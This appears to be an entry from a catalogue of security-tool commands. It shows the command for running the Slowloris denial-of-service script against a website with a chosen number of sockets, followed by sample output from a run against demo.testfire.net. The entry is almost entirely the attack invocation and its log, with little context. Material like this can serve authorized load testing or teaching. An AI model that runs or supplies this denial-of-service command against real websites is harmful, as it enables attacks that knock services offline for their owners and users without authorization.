---
id: 111bf9af-e7ed-4849-8ff5-1ab8781ff226
name: Slowloris
type: command
executor: ''
data: python3 slowloris.py [website url] -s [number of sockets]
output: '[06-09-2020 23:39:23] Attacking https://demo.testfire.net with 300 packets.

  [06-09-2020 23:39:23] Creating sockets...

  [06-09-2020 23:39:57] Sending keep-alive headers... socket count: 0

  [06-09-2020 23:40:32] Sending keep-alive headers... socket count: 0

  [06-09-2020 23:41:21] Sending keep-alive headers... socket count: 0

  [06-09-2020 23:41:51] Sending keep-alive headers... socket count: 0

  [06-09-2020 23:42:22] Sending keep-alive headers... socket count: 0

  [06-09-2020 23:43:03] Sending keep-alive headers... socket count: 0

  [06-09-2020 23:44:43] Sending keep-alive headers... socket count: 0

  [06-09-2020 23:45:13] Sending keep-alive headers... socket count: 0

  [06-09-2020 23:46:53] Sending keep-alive headers... socket count: 0

  [06-09-2020 23:47:16] Sending keep-alive headers... socket count: 0'
created_at: '2020-09-06T18:17:44.926621+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Slowloris

```bash
python3 slowloris.py [website url] -s [number of sockets]
```

## Expected Output

```
[06-09-2020 23:39:23] Attacking https://demo.testfire.net with 300 packets.
[06-09-2020 23:39:23] Creating sockets...
[06-09-2020 23:39:57] Sending keep-alive headers... socket count: 0
[06-09-2020 23:40:32] Sending keep-alive headers... socket count: 0
[06-09-2020 23:41:21] Sending keep-alive headers... socket count: 0
[06-09-2020 23:41:51] Sending keep-alive headers... socket count: 0
[06-09-2020 23:42:22] Sending keep-alive headers... socket count: 0
[06-09-2020 23:43:03] Sending keep-alive headers... socket count: 0
[06-09-2020 23:44:43] Sending keep-alive headers... socket count: 0
[06-09-2020 23:45:13] Sending keep-alive headers... socket count: 0
[06-09-2020 23:46:53] Sending keep-alive headers... socket count: 0
[06-09-2020 23:47:16] Sending keep-alive headers... socket count: 0
```


